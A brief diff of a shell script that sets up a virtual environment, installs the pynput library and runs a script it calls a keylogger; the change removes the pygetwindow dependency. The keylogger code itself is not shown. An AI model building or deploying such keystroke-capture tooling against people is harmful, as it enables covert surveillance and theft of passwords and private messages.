@@ -23,7 +23,7 @@ source keylogger_env/bin/activate
 
 # Install dependencies (e.g., pynput and pygetwindow)
 echo "Installing dependencies..."
-pip3 install pynput pygetwindow
+pip3 install pynput
 
 # Run the keylogger script
 echo "Running the script..."
